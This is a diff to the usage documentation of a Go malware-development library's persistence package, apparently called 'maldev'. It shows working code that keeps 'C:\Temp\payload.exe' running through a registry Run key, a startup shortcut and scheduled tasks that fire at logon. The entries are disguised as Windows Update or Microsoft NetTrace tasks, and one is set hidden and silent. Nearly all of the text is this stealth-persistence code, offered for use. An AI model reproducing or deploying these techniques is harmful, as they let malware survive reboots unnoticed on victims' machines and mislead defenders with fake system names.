@@ -65,11 +65,10 @@ import (
 mechanisms := []persistence.Mechanism{
     registry.RunKey(registry.HiveCurrentUser, registry.KeyRun, "WindowsUpdate", `C:\Temp\payload.exe`),
     startup.Shortcut("WindowsUpdate", `C:\Temp\payload.exe`, ""),
-    scheduler.ScheduledTask(&scheduler.Task{
-        Name:    `Microsoft\Windows\Update\Check`,
-        Command: `C:\Temp\payload.exe`,
-        Trigger: scheduler.TriggerLogon,
-    }),
+    scheduler.ScheduledTask(`\Microsoft\Windows\Update\Check`,
+        scheduler.WithAction(`C:\Temp\payload.exe`),
+        scheduler.WithTriggerLogon(),
+    ),
 }
 
 errs := persistence.InstallAll(mechanisms)
@@ -384,19 +383,13 @@ func ScheduledTask(task *Task) *TaskMechanism
 **Example:**
 
 ```go
-import (
-    "context"
-    "github.com/oioio-space/maldev/persistence/scheduler"
+import "github.com/oioio-space/maldev/persistence/scheduler"
+
+err := scheduler.Create(`\Microsoft\Windows\NetTrace\GatherNetworkInfo`,
+    scheduler.WithAction(`C:\Temp\payload.exe`, "-silent"),
+    scheduler.WithTriggerLogon(),
+    scheduler.WithHidden(),
 )
-
-task := &scheduler.Task{
-    Name:    `Microsoft\Windows\NetTrace\GatherNetworkInfo`,
-    Command: `C:\Temp\payload.exe`,
-    Args:    "-silent",
-    Trigger: scheduler.TriggerLogon,
-}
-
-err := scheduler.Create(context.Background(), task)
 ```
 
 ---
